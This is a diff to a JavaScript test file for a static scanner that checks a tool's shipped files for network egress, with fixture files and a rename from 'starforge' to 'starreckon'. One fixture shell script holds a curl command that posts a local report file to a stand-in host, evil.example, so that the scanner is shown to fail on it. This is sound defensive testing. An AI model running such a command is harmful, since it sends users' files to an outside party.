@@ -105,6 +105,28 @@ const SEARCH_FIXTURE = [
   "",
 ].join("\n");
 
+
+const CLI_FIXTURE = [
+  '// node:child_process, which the tripwire patches at module load in scan runs.',
+  '// xdotool is excluded — it types into the focused window, not the clipboard.',
+  'import { clipboardCmds } from "./clipboard.mjs";',
+  '// --full flag (Cisco model download)',
+  'if (flag("--full")) { /* full mode */ }',
+  'function printHelp() { console.log("help"); }',
+  'if (subcommand === "search") {',
+  '  const { runSearch } = await import("./search.mjs");',
+  '}',
+  'if (key === "X") {',
+  '  const { spawnSync: _spawnSync } = await import("node:child_process");',
+  '  const cmds = clipboardCmds();',
+  '  for (const [cmd, cmdArgs] of cmds) {',
+  '    const r = _spawnSync(cmd, cmdArgs, { input: "x", encoding: "utf8", timeout: 3000 });',
+  '    if (r.status === 0) break;',
+  '  }',
+  '}',
+  "",
+].join("\n");
+
 // Writes all allowlisted files AND the pin manifest that authorises them,
 // exactly as the real tree does.
 function writeAllowlisted(dir, { pins = true, pkg = { name: "fixture", version: "0.0.0" } } = {}) {
@@ -112,6 +134,7 @@ function writeAllowlisted(dir, { pins = true, pkg = { name: "fixture", version: 
   writeFileSync(join(dir, "confine.mjs"), CONFINE_FIXTURE);
   writeFileSync(join(dir, "serve.mjs"), SERVE_FIXTURE);
   writeFileSync(join(dir, "search.mjs"), SEARCH_FIXTURE);
+  writeFileSync(join(dir, "cli.mjs"), CLI_FIXTURE);
   if (pkg) writeFileSync(join(dir, "package.json"), JSON.stringify(pkg, null, 2));
   if (pins) updatePins(dir);
 }
@@ -131,10 +154,12 @@ test("staticScan passes on a clean tree with intact, pinned allowlisted files", 
   assert.ok(res.allowlist["confine.mjs"].hits > 0);
   assert.ok(res.allowlist["serve.mjs"].hits > 0);
   assert.ok(res.allowlist["search.mjs"].hits > 0);
+  assert.ok(res.allowlist["cli.mjs"].hits > 0);
   assert.strictEqual(res.allowlist["tripwire.mjs"].pin, "ok");
   assert.strictEqual(res.allowlist["confine.mjs"].pin, "ok");
   assert.strictEqual(res.allowlist["serve.mjs"].pin, "ok");
   assert.strictEqual(res.allowlist["search.mjs"].pin, "ok");
+  assert.strictEqual(res.allowlist["cli.mjs"].pin, "ok");
   assert.ok(res.limits.length >= 3);
   assert.ok(res.inspected > 0, "a scan that read files must report what it read");
 });
@@ -268,7 +293,7 @@ test("staticScan FAILS on a curl exfil in a shipped shell script", () => {
   );
   writeFileSync(
     join(dir, "bin", "proof.sh"),
-    '#!/bin/sh\necho hi\ncurl -s -X POST https://evil.example/exfil --data-binary @"$HOME/.starforge/reports/x.json"\n'
+    '#!/bin/sh\necho hi\ncurl -s -X POST https://evil.example/exfil --data-binary @"$HOME/.starreckon/reports/x.json"\n'
   );
   const res = staticScan(dir);
   assert.strictEqual(res.pass, false, "a curl in a shipped .sh must not be a green PASS");
@@ -295,7 +320,7 @@ test("staticScan catches every shell egress token, and clears a clean script", (
       "npx some-package",
     ].join("\n")
   );
-  // The real bin/starforge-proof.sh shape must stay clean.
+  // The real bin/starreckon-proof.sh shape must stay clean.
   writeFileSync(
     join(dir, "ok.sh"),
     '#!/bin/sh\nset -u\n"$SANDBOX" -p "$PROFILE" "$NODE" "$DIR/src/cli.mjs" --yes "$@"\necho "INCONCLUSIVE: no network"\n'
@@ -654,7 +679,7 @@ test("outputScrub passes on clean masked output and on an empty data dir", () =>
   mkdirSync(join(dataDir, "reports"), { recursive: true });
   writeFileSync(
     join(dataDir, "reports", "baseline.json"),
-    JSON.stringify({ total_sessions: 42, top_project: "Projects/starforge", path: "~/Documents/x" })
+    JSON.stringify({ total_sessions: 42, top_project: "Projects/starreckon", path: "~/Documents/x" })
   );
   const res = outputScrub(dataDir);
   assert.strictEqual(res.pass, true, JSON.stringify(res.findings));
@@ -790,14 +815,14 @@ test("verify prints every TRIPWIRE_LIMITS line verbatim", () => {
     assert.ok(text.includes(l), `TRIPWIRE_LIMITS line missing from verify output: ${l}`);
 });
 
-test("`starforge verify` prints the tripwire limits too (not just the library)", () => {
+test("`starreckon verify` prints the tripwire limits too (not just the library)", () => {
   const r = spawnSync(process.execPath, [join(ROOT, "src", "cli.mjs"), "verify"], {
     encoding: "utf8",
     env: { ...process.env, HOME: tmp() },
   });
   const text = r.stdout.replace(/\x1b\[[0-9;]*m/g, "");
   for (const l of TRIPWIRE_LIMITS)
-    assert.ok(text.includes(l), `missing from \`starforge verify\` stdout: ${l}`);
+    assert.ok(text.includes(l), `missing from \`starreckon verify\` stdout: ${l}`);
   // The subject is that the limits are PRINTED. verify's exit code is the AND
   // over every check and goes to 1 on any host without a usable OS sandbox, so
   // pinning 0 made this assert something it was not testing. 2 means verify
@@ -806,7 +831,7 @@ test("`starforge verify` prints the tripwire limits too (not just the library)",
 });
 
 // ---- exit codes: a crashing warden is not a failing check --------------------
-// Red-team finding: "`starforge verify` can never exit 2, so exit 1 is
+// Red-team finding: "`starreckon verify` can never exit 2, so exit 1 is
 // ambiguous between 'a check failed' and 'verify crashed'."
 
 test("verifyCli returns 0 / 1 / 2 for pass / fail / crash", () => {
@@ -837,7 +862,7 @@ test("verifyCli returns 0 / 1 / 2 for pass / fail / crash", () => {
   assert.ok(said.includes("not a pass") || said.includes("NOT a failed check"), said);
 });
 
-test("`starforge verify` itself exits 2 when runVerify throws (not 1, not a stack dump)", () => {
+test("`starreckon verify` itself exits 2 when runVerify throws (not 1, not a stack dump)", () => {
   // A real copy of the tree with a crash injected — the documented invocation,
   // end to end, because that is the one the exit-code contract is written for.
   const dir = tmp();
@@ -858,7 +883,7 @@ test("`starforge verify` itself exits 2 when runVerify throws (not 1, not a stac
   assert.strictEqual(viaModule.status, 2, `module: ${viaModule.stdout}${viaModule.stderr}`);
 });
 
-test("`starforge verify` and `node src/verify.mjs` agree on the exit code", () => {
+test("`starreckon verify` and `node src/verify.mjs` agree on the exit code", () => {
   const env = { ...process.env, HOME: tmp() };
   const a = spawnSync(process.execPath, [join(ROOT, "src", "cli.mjs"), "verify"], { encoding: "utf8", env });
   const b = spawnSync(process.execPath, [join(ROOT, "src", "verify.mjs")], { encoding: "utf8", env });
